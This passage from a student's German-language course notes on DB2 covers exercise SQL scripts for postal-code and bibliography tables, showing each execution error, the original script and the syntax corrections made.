IS '4 digits of ZIP'\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP6 IS 'Full ZIP (6 digits)'\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.SHORTCITY IS 'Short city name (27 characters)';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.COUNTRY IS 'Country';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ADDRSCANTON IS 'Address canton';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.STREETNR IS 'Street no w/o addon';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.STREETNRADDON IS 'Addon (like 22A)';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.POLGNAME IS 'Pol. municipality name';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.POLGCANTON IS 'Municipality canton';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.LASTUPDATED IS 'timestamp of last change';\nCREATE TABLE UEB03B.TBDPOSTFILEZIP (\nTBDPOSTFILEZIPID     BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nCITY                 VARCHAR(60),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2)\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR(60)\nCANTON               CHAR(2),\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP,\nPRIMARY KEY (TBDPOSTFILEZIPID)\n)\nIN STBDPOSTFILEZIP\n;\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.TBDPOSTFILEZIPID IS '''Primary Key''';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.ZIP4 IS '4 digits of ZIP';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.ZIP6 IS 'Full ZIP (6 digits)';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.CITY IS 'City name';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.SHORTCITY IS 'Short city name (27 characters)';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.COUNTRY IS 'Country';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.POLGNAME IS 'Pol. municipality name';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.CANTON IS 'Municipality canton';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILEZIP.LASTUPDATED IS 'timestamp of last change';\nCREATE UNIQUE INDEX UEB03B.XPKTBDPOSTFILESTRE ON  TBDPOSTFILESTREET (\nTBDPOSTFILESTREETID            ASC\n);\nCREATE INDEX UEB03B.XIE1TBDPOSTFILESTR ON UEB03.TBDPOSTFILESTREET\n(\nZIP6                           ASC\n);\nCREATE INDEX UEB03B.XIE2TBDPOSTFILESTR ON UEB03B.TBDPOSTFILESTREET\n(\nSTREET                         ASC,\nZIP6                           ASC,\nSTREETNR                       ASC\n);\nCREATE INDEX UEB03B.XIE3TBDPOSTFILESTR ON UEB03B.TBDPOSTFILESTREET\n(\nZIP4                           ASC\n);\nCREATE INDEX UEB03B.XIE4TBDPOSTFILESTR ON UEB03B.TBDPOSTFILESTREET\n(\nSTREET                         ASC,\nZIP4                           ASC,\nSTREETNR                       ASC\n);\nCREATE INDEX UEB03B.XIE5TBDPOSTFILESTR ON UEB03B.TBDPOSTFILESTREET\n(\nBFSNR                          ASC\n);\nCREATE UNIQUE INDEX UEB03B.XPKTBDPOSTFILEZIP ON UEB03B.TBDPOSTFILEZIP\n(\nTBDPOSTFILEZIPID               ASC\n);\nCREATE INDEX UEB03B.XIE1TBDPOSTFILEZIP ON UEB03B.TBDPOSTFILEZIP\n(\nBFSNR                           ASC\n);\nCREATE INDEX UEB03B.XIE2TBDPOSTFILEZIP ON UEB03B.TBDPOSTFILEZIP\n(\nZIP4                           ASC\n);\nCREATE INDEX UEB03B.XIE3TBDPOSTFILEZIP ON UEB03B.TBDPOSTFILEZIP\n(\nZIP6                           ASC\n);\nECHO ******************** END OF SCRIPT ******************************; </code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#anpassungen_1","title":"Anpassungen:","text":"<pre><code>-- Vorher\nDROP TABLE UEB03B.TBDPOSTFILESTREET;\nDROP TABLE UEB03B.TBDPOSTFILEZIP;\n-- Nachher\nDROP TABLE IF EXISTS UEB03B.TBDPOSTFILESTREET;\nDROP TABLE IF EXISTS UEB03B.TBDPOSTFILEZIP;\nCREATE TABLESPACE STBDPOSTFILESTREET\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\nCREATE TABLESPACE STBDPOSTFILEZIP\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\n</code></pre> <pre><code>-- Vorher\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP4 IS '4 digits of ZIP'\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP6 IS 'Full ZIP (6 digits)'\n-- Nachher\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP4 IS '4 digits of ZIP';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03B.TBDPOSTFILESTREET.ZIP6 IS 'Full ZIP (6 digits)';\n</code></pre> <pre><code>-- Vorher\nCOUNTRY              CHAR(2)\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR(60)\n-- Nachher\nCOUNTRY              CHAR(2),\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR(60),\n</code></pre> <pre><code>-- Vorher\nCREATE UNIQUE INDEX UEB03B.XPKTBDPOSTFILESTRE ON  TBDPOSTFILESTREET (\nTBDPOSTFILESTREETID            ASC\n);\nCREATE INDEX UEB03B.XIE1TBDPOSTFILESTR ON UEB03.TBDPOSTFILESTREET\n(\nZIP6                           ASC\n);\n-- Nachher\nCREATE UNIQUE INDEX UEB03B.XPKTBDPOSTFILESTRE ON UEB03B.TBDPOSTFILESTREET\n(\nTBDPOSTFILESTREETID            ASC\n);\nCREATE INDEX UEB03B.XIE1TBDPOSTFILESTR ON UEB03B.TBDPOSTFILESTREET\n(\nZIP6                           ASC\n);\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ueb03-03sql","title":"UEB03-03.sql","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausfuhrungs-fehler_2","title":"Ausf\u00fchrungs Fehler:","text":"<pre><code>CREATE TABLE UEB03C.TBDPOSTFILEZIP ( TBDPOSTFILEZIPID     BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000), ZIP4                 CHAR(4), ZIPADDON             CHAR(2), ZIP6                 CHAR(6), CITY                 VARCHAR(60), SHORTCITY            VARCHAR(54), COUNTRY              CHAR(2), BFSNR                INTEGER, POLGNAME             VARCHAR, CANTON               CHAR(2), LASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP ) IN STBDPOSTFILEZIP\nDB21034E  The command was processed as an SQL statement because it was not a \nvalid Command Line Processor command.  During SQL processing it returned:\nSQL0604N  The length, precision, or scale attribute for column, distinct type, \nstructured type, array type, attribute of structured type, routine, cast \ntarget type, type mapping, or global variable \"VARCHAR\" is not valid.  \nSQLSTATE=42611\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#zuvor_2","title":"Zuvor:","text":"UEB03-03.sql<pre><code>-- ------------------------------------------------------------------------------------------------\n-- Dies ist ein Kommentar, d.h. diese Zeile wird NICHT ausgefuehrt\n-- ------------------------------------------------------------------------------------------------\n-- mit dieser Anweisung wird der AUTO COMMIT (Schreiben in die Datenbank ausgeschaltet)\n-- alle Ver\u00e4nderungen sind nur innerhalb der aktuellen Session g\u00fcltig\nUPDATE COMMAND OPTIONS USING C OFF; --DROP TABLE UEB03C.TBDPOSTFILESTREET;\n--DROP TABLE UEB03C.TBDPOSTFILEZIP;\nCREATE TABLE UEB03C.TBDPOSTFILESTREET (\nTBDPOSTFILESTREETID  BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nSTREET               VARCHAR(120),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nADDRSCANTON          CHAR(2),\nSTREETNR             INTEGER,\nSTREETNRADDON        VARCHAR(6),\nPOLGNAME             VARCHAR(60),\nPOLGCANTON           CHAR(2),\nBFSNR                INTEGER,\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP\n)\nIN STBDPOSTFILESTREET\n;\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.TBDPOSTFILESTREETID IS '''Primary Key''';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.STREET IS 'Street name';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.ZIP4 IS '4 digits of ZIP';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.ZIP6 IS 'Full ZIP (6 digits)';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.SHORTCITY IS 'Short city name (27 characters)';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.COUNTRY IS 'Country';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.ADDRSCANTON IS 'Address canton';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.STREETNR IS 'Street no w/o addon';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.STREETNRADDON IS 'Addon (like 22A)';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.POLGNAME IS 'Pol. municipality name';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.POLGCANTON IS 'Municipality canton';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILESTREET.LASTUPDATED IS 'timestamp of last change';\nCREATE TABLE UEB03C.TBDPOSTFILEZIP (\nTBDPOSTFILEZIPID     BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nCITY                 VARCHAR(60),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR,\nCANTON               CHAR(2),\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP\n)\nIN STBDPOSTFILEZIP\n;\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.TBDPOSTFILEZIPID IS '''Primary Key''';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.ZIP4 IS '4 digits of ZIP';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.ZIPADDON IS 'ZIP addon';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.ZIP6 IS 'Full ZIP (6 digits)';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.CITY IS 'City name'\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.SHORTCITY IS 'Short city name (27 characters)';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.COUNTRY IS 'Country';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.POLGNAME IS 'Pol. municipality name';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.CANTON IS 'Municipality canton';\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.LASTUPDATED IS 'timestamp of last change';\nCREATE UNIQUE INDEX UEB03C.XPKTBDPOSTFILESTRE ON UEB03C.TBDPOSTFILESTREET\n(\nTBDPOSTFILESTREETID            ASC\n);\nCREATE INDEX UEB03C.XIE1TBDPOSTFILESTR ON UEB03C.TBDPOSTFILESTREET\n(\nZIP6                           ASC\n);\nCREATE INDEX UEB03C.XIE2TBDPOSTFILESTR ON UEB03C.TBDPOSTFILESTREET\n(\nSTREET                         ASC,\nZIP6                           ASC,\nSTREETNR                       ASC\n);\nALTER TABLE UEB03C.TBDPOSTFILESTREET  ADD CONSTRAINT XPKTBDPOSTFILESTRE PRIMARY KEY (\nTBDPOSTFILESTREETID\n);\nCREATE INDEX UEB03C.XIE3TBDPOSTFILESTR ON UEB02.TBDPOSTFILESTREET\n(\nZIP4                           ASC\n);\nCREATE INDEX UEB03C.XIE4TBDPOSTFILESTR ON UEB03C.TBDPOSTFILESTREET\n(\nSTREET                         ASC,\nZIP4                           ASC,\nSTREETNR                       ASC\n);\nCREATE INDEX UEB03C.XIE5TBDPOSTFILESTR ON UEB03C.TBDPOSTFILESTREET\n(\nBFSNR                          ASC\n);\nCREATE UNIQUE INDEX UEB03C.XPKTBDPOSTFILEZIP ON UEB03C.TBDPOSTFILEZIP\n(\nTBDPOSTFILEZIPID               ASC\n);\nALTER TABLE UEB03C.TBDPOSTFILEZIP  ADD CONSTRAINT XPKTBDPOSTFILEZIP PRIMARY KEY (\nTBDPOSTFILEZIPID\n);\nCREATE INDEX UEB03C.XIE1TBDPOSTFILEZIP ON UEB03C.TBDPOSTFILEZIP\n(\nBFSNR                           ASC\n);\nCREATE INDEX UEB03C.XIE2TBDPOSTFILEZIP ON UEB03C.TBDPOSTFILEZIP\n(\nZIP4                           ASC\n);\nCREATE INDEX UEB03C.XIE3TBDPOSTFILEZIP ON UEB03C.TBDPOSTFILEZIP\n(\nZIP6                           ASC\n);\nECHO ******************** END OF SCRIPT ********************; </code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#anpassungen_2","title":"Anpassungen:","text":"<pre><code>-- Vorher\n--DROP TABLE UEB03C.TBDPOSTFILESTREET;\n--DROP TABLE UEB03C.TBDPOSTFILEZIP;\n-- Nachher\nDROP TABLE IF EXISTS UEB03B.TBDPOSTFILESTREET;\nDROP TABLE IF EXISTS UEB03B.TBDPOSTFILEZIP;\nCREATE TABLESPACE STBDPOSTFILESTREET\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\nCREATE TABLESPACE STBDPOSTFILEZIP\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\n</code></pre> <pre><code>-- Vorher\nCREATE TABLE UEB03C.TBDPOSTFILEZIP (\nTBDPOSTFILEZIPID     BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nCITY                 VARCHAR(60),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR,\nCANTON               CHAR(2),\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP\n)\nIN STBDPOSTFILEZIP\n;\n-- Nachher\nCREATE TABLE UEB03C.TBDPOSTFILEZIP (\nTBDPOSTFILEZIPID     BIGINT NOT NULL GENERATED BY DEFAULT AS IDENTITY( START WITH 1, INCREMENT BY 1, CACHE 100000),\nZIP4                 CHAR(4),\nZIPADDON             CHAR(2),\nZIP6                 CHAR(6),\nCITY                 VARCHAR(60),\nSHORTCITY            VARCHAR(54),\nCOUNTRY              CHAR(2),\nBFSNR                INTEGER,\nPOLGNAME             VARCHAR(60),\nCANTON               CHAR(2),\nLASTUPDATED          TIMESTAMP NOT NULL DEFAULT CURRENT TIMESTAMP\n)\nIN STBDPOSTFILEZIP\n;\n</code></pre> <p><pre><code>-- Vorher\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.CITY IS 'City name'\n-- Nachher\nCOMMENT ON COLUMN UEB03C.TBDPOSTFILEZIP.CITY IS 'City name';\n</code></pre> cleanup <pre><code>-- Vorher\nCREATE INDEX UEB03C.XIE3TBDPOSTFILESTR ON UEB02.TBDPOSTFILESTREET\n(\nZIP4                           ASC\n);\n-- Nachher\nCREATE INDEX UEB03C.XIE3TBDPOSTFILESTR ON UEB03C.TBDPOSTFILESTREET\n(\nZIP4                           ASC\n);\n</code></pre></p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ueb03-04sql","title":"UEB03-04.sql","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#ausfuhrungs-fehler_3","title":"Ausf\u00fchrungs Fehler:","text":"<pre><code>CREATE TABLE  \"ARTIKEL\" ( \"ARTIKELID\"        INTEGER NOT NULL , \"TITEL\"            VARCHAR(255) , \"JAHR\"             SMALLINT , \"AUSTITEL\"         VARCHAR(255) \"SEITE_VON\"        SMALLINT , \"SEITE_BIS\"        SMALLINT , \"BUCHID\"           INTEGER , \"URL\"              VARCHAR 200 , \"CR\"               VARCHAR(80) , \"BEMERKUNG\"        VARCHAR(100) ) IN \"MYTABLESPACE1\" \nDB21034E  The command was processed as an SQL statement because it was not a \nvalid Command Line Processor command.  During SQL processing it returned:\nSQL0104N  An unexpected token \"SMALLINT\" was found following \"HAR(255) \n\"SEITE_VON\"\".  Expected tokens may include:  \"&lt;references_spec&gt;\".  \nSQLSTATE=42601\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#zuvor_3","title":"Zuvor:","text":"UEB03-04.sql<pre><code>--------------------------------------------------------------------------\n-- Set autocommit off\n--------------------------------------------------------------------------\nUPDATE COMMAND OPTIONS USING C OFF;\n--------------------------------------------------------------------------\n-- Set Schema UEB03D, Set \n--   - setzt Default-Schema, falls in Objekt-Referent nicht angegeben\n--------------------------------------------------------------------------\nSET SCHEMA UEB03D;\n--------------------------------------------------------------------------\n-- Stop execution on command error OFF\n--------------------------------------------------------------------------\nUPDATE COMMAND OPTIONS USING S OFF;\n--------------------------------------------------------------------------\n-- DROP objects in schema UEB03D\n--------------------------------------------------------------------------\nDROP TABLE \"ARTIKEL\" ;\nDROP TABLE \"ART_SW\" ;\nDROP TABLE \"ART_AUT\" ;\nDROP TABLE \"AUTOR\" ;\nDROP TABLE \"BUCH_AUT\" ;\nDROP TABLE \"BUCH_SW\" ;\nDROP TABLE \"BUCHTITEL\" ;\nDROP TABLE \"DISS_AUT\" ;\nDROP TABLE \"DISS_SW\" ;\nDROP TABLE \"DISSERTATION\" ;\nDROP TABLE \"INSTITUTION\" ;\nDROP TABLE \"REPORT\" ;\nDROP TABLE \"REPORT_AUT\" ;\nDROP TABLE \"REPORT_SW\" ;\nDROP TABLE \"SCHLAGWORT\" ;\nDROP TABLE \"VERLAG\" ;\n--------------------------------------------------------------------------\n-- Stop execution on command error ON\n--------------------------------------------------------------------------\nUPDATE COMMAND OPTIONS USING S ON;\n--------------------------------------------------------------------------\n-- CREATE tables in schema UEB03D\n--------------------------------------------------------------------------\nCREATE TABLE  \"ARTIKEL\"  (\n\"ARTIKELID\"        INTEGER NOT NULL ,\n\"TITEL\"            VARCHAR(255) ,\n\"JAHR\"             SMALLINT ,\n\"AUSTITEL\"         VARCHAR(255) \"SEITE_VON\"        SMALLINT ,\n\"SEITE_BIS\"        SMALLINT ,\n\"BUCHID\"           INTEGER ,\n\"URL\"              VARCHAR 200 ,\n\"CR\"               VARCHAR(80) ,\n\"BEMERKUNG\"        VARCHAR(100) )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"ART_SW\"  (\n\"ARTIKELID\"         INTEGER NOT NULL ,\n\"SWID\"              INTEGER NOT NULL )\nIN \"MYTABLESPACE1\" CREATE TABLE  \"ART_AUT\"  (\n\"ARTIKELID\"         INTEGER NOT NULL ,\n\"AUTORID\"           INTEGER NOT NULL ,\n\"ROLLE\"             VARCHAR(1) ,\n\"RANG\"              SMALLINT )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"AUTOR\"  (\n\"AUTORID\"           INTEGER NOT NULL ,\n\"NAME\"              VARCHAR(30) ,\n\"ZUSATZ\"            VARCHAR(10) ,\n\"INITIALEN\"         VARCHAR(6) ,\n\"VORNAMEN\"          VARCHAR(30) ,\n\"INSTITUTION        VARCHAR(50) ,\n       URL\"                VARCHAR(200) ,\n\"BEMERKUNG\"         VARCHAR(10000) ,\n\"PSEUDONYM\"         INTEGER )\nIN \"MYTABLESPACE1\" ; CREATE TABLE  \"BUCH_AUT\"  ( \"BUCHID\"            INTEGER NOT NULL ,\n\"AUTORID\"           INTEGER NOT NULL ,\n\"ROLLE\"             VARCHAR(1) ,\n\"RANG\"              SMALLINT )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"BUCH_SW\"  (\n\"BUCHID\"           INTEGER NOT NULL ,\n\"SWID\"             INTEGER NOT NULL )\nIN \"MYTABLESPACE1\" CREATE TABLE  \"BUCHTITEL\"  (\n\"BUCHID\"           INTEGER NOT NULL ,\n\"GESAMTID\"         INTEGER ,\n\"BANDNR\"           SMALLINT ,\n\"HSTITEL\"          VARCHAR(255) ,\n\"ESTITEL\"          VARCHAR(100) ,\n\"ISBN\"             VARCHAR(15) ,\n\"ISBN2\"            VARCHAR  ,\n\"AUFLAGE\"          VARCHAR(70) ,\n\"JAHR\"             SMALLINT ,\n\"MEDIUM\"           VARCHAR(20) ,\n\"UMFANG\"           VARCHAR(50) ,\n\"PREIS\"            VARCHAR(20) ,\n\"BEZUGINFO\"        VARCHAR(30) ,\n\"VERF_IN_VORLFORM\" VARCHAR(130) ,\n\"REIHE1\"           VARCHAR(150) ,\n\"REIHE2\"           VARCHAR(150) ,\n\"KSCHAFT1\"         VARCHAR(100) ,\n\"KSCHAFT2\"         VARCHAR(100) ,\n\"HSV\"              VARCHAR(50) ,\n\"SIGNATUR\"         VARCHAR(30) ,\n\"ZUGANGSNR\"        VARCHAR(30) ,\n\"BESTAND\"          VARCHAR(50) ,\n\"WEITEXEMP\"        VARCHAR(30) ,\n\"ERFDATUM\"         VARCHAR(17) ,\n\"AENDATUM\"         VARCHAR(17) ,\n\"VERLAGSID\"        INTEGER ,\n\"URL\"              VARCHAR(200) ,\n\"CR\"               VARCHAR(80) ,\n\"BEMERKUNG\"        VARCHAR(100) ,\n\"BAENDE\"           SMALLINT )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"DISS_AUT\"  (\n\"DISSID\"           INTEGER NOT NULL \"AUTORID\"          INTEGER NOT NULL ,\n\"ROLLE\"            VARCHAR(1) ,\n\"RANG\"             SMALLINT )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"DISS_SW\"  (\n\"DISSID\"           INTEGER NOT NULL ,\n\"SWID\"             INTEGER NOT NULL )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"DISSERTATION\"  (\n\"DISSID\"            INTEGER NOT NULL ,\n\"TITEL\"             VARCHAR(255) ,\n\"INSTID\"            INTEGER ,\n\"ORT\"               VARCHAR(80) ,\n\"JAHR\"              SMALLINT ,\n\"ISBN\"              VARCHAR(15) ,\n\"TYP\"               VARCHAR(1) ,\n\"UMFANG\"            VARCHAR(50) \"SIGNATUR\"          VARCHAR(30) ,\n\"ZUGANGSNR\"         VARCHAR(50) ,\n\"BESTAND\"           VARCHAR(30) ,\n\"URL\"               VARCHAR(200) ,\n\"CR\"                VARCHAR(80) ,\n\"BEMERKUNG\"         VARCHAR(100) )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"INSTITUTION\"  (\n\"INSTID\"            INTEGER NOT NULL ,\n\"NAME\"              VARCHAR(80) ,\n\"ORT\"               VARCHAR(80) ,\n\"ADRESSE\"           VARCHAR(80) ,\n\"TEL\"               VARCHAR(20) ,\n\"URL\"               VARCHAR(200 ,\n\"BEMERKUNG\"         VARCHAR(100) ,\n\"FAX\"               VARCHAR(20) )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"REPORT\"  (\n\"REPORTID\"          INTEGER NOT NULL ,\n\"TITEL\"             VARCHAR(255) ,\n\"INSTID\"            INTEGER ,\n\"JAHR\"              SMALLINT ,\n\"LFDNR\"             SMALLINT ,\n\"URL\"               VARCHAR(200) ,\n\"CR\"                VARCHAR(80) ,\n\"UMFANG\"            VARCHAR(50) ,\n\"BEMERKUNG\"         VARCHAR(100) ,\n\"REIHE\"             VARCHAR(150) ,\n\"SIGNATUR\"          VARCHAR(30) ,\n)\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"REPORT_AUT\"  (\n\"REPORTID\"         INTEGER NOT NULL ,\n\"AUTORID\"          INTEGER NOT NULL ,\n\"RANG\"             SMALLINT )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"SCHLAGWORT\"  (\n\"SWID\"              INTEGER NOT NULL ,\n\"SCHLAGWORT\"        VARCHAR(50) )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"REPORT_SW\"  (\n\"REPORTID\"          INTEGER NOT NULL ,\n\"SWID\"              INTEGER NOT NULL )\nIN \"MYTABLESPACE1\" ;\nCREATE TABLE  \"VERLAG\"  (\n\"VERLAGSID\"         INTEGER NOT NULL ,\n\"NAME\"              VARCHAR(80) ,\n\"ORT\"               VARCHAR(80) ,\n\"ISBNKZ\"            VARCHAR(10) ,\n\"ADRESSE\"           VARCHAR 80 ,\n\"TEL\"               VARCHAR(20) ,\n\"URL\"               VARCHAR(200) ,\n\"BEMERKUNG\"         VARCHAR(100) ,\n\"FAX\"               VARCHAR(20) )\nIN \"MYTABLESPACE1\" ;\n--------------------------------------------------------------------------\n-- Add constraint for primary keys\n--------------------------------------------------------------------------\nALTER TABLE  \"ARTIKEL\"      ADD CONSTRAINT \"PK_ARTIKEL\"      PRIMARY KEY (\"ARTIKELID\");\nALTER TABLE  \"ART_SW\"       ADD CONSTRAINT \"PK_ART_SW\"       PRIMARY KEY (\"ARTIKELID\", \"SWID\");\nALTER TABLE  \"ART_AUT\"      ADD CONSTRAINT \"PK_ART_AUT\"      PRIMARY KEY (\"ARTIKELID\", \"AUTORID\");\nALTER TABLE  \"AUTOR\"        ADD CONSTRAINT \"PK_AUTOR\"        PRIMARY KEY (\"AUTOR\");\nALTER TABLE  \"BUCH_AUT\"     ADD CONSTRAINT \"PK_BUCH_AUT\"     PRIMARY KEY (\"BUCHID\", \"AUTORID\");\nALTER TABLE  \"BUCH_SW\"      ADD CONSTRAINT \"PK_BUCH_SW\"      PRIMARY KEY (\"BUCHID\", \"SWID\");\nALTER TABLE  \"BUCHTITEL\"    ADD CONSTRAINT \"PK_BUCHTITEL\"    PRIMARY KEY (\"BUCHID\");\nALTER TABLE  \"DISS_AUT\"     ADD CONSTRAINT \"PK_DISS_AUT\"     PRIMARY KEY (\"DISSID\", \"AUTORID\");\nALTER TABLE  \"DISS_SW\"      ADD CONSTRAINT \"PK_DISS_SW\"      PRIMARY KEY (\"DISSID\", \"SWID\");\nALTER TABLE  \"DISSERTATION\" ADD CONSTRAINT \"PK_DISSERTATION\" PRIMARY KEY (\"DISSID\");\nALTER TABLE  \"INSTITUTION\"  ADD CONSTRAINT \"PK_INSTITUTION\"  PRIMARY KEY (\"INSTID\");\nALTER TABLE  \"REPORT\"       ADD CONSTRAINT \"PK_REPORT\"       PRIMARY KEY (\"REPORTID\");\nALTER TABLE  \"REPORT_AUT\"   ADD CONSTRAINT \"PK_REPORT_AUT\"   PRIMARY KEY (\"REPORTID\", \"AUTORID\");\nALTER TABLE  \"REPORT_SW\"    ADD CONSTRAINT \"PK_REPORT_SW\"    PRIMARY KEY (\"REPORTID\", \"SWID\");\nALTER TABLE  \"SCHLAGWORT\"   ADD CONSTRAINT \"PK_SCHLAGWORT\"   PRIMARY KEY (\"SWID\");\nALTER TABLE  \"VERLAG\"       ADD CONSTRAINT \"PK_VERLAG\"       PRIMARY KEY (\"VERLAGSID\");\n--------------------------------------------------------------------------\n-- Add additional indexes\n--------------------------------------------------------------------------\nCREATE INDEX  \"I_ARTIKEL_BUCHID\" ON  \"TARTIKEL\"  (\"BUCHID\" ASC) ALLOW REVERSE SCANS;\nCREATE INDEX  \"I_AUTOREN_NAME\" ON  \"AUTOR\"  (\"NACHNAME\" ASC  \"VORNAMEN\" ASC) PCTFREE REVERSE SCANS;\n--------------------------------------------------------------------------\n-- Commit work\n--------------------------------------------------------------------------\nCOMMIT WORK;\nECHO ******************** END OF SCRIPT ********************; </code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-3/#anpassungen_3","title":"Anpassungen:","text":"<pre><code>--------------------------------------------------------------------------\n-- Set autocommit off\n--------------------------------------------------------------------------\nUPDATE COMMAND OPTIONS USING C 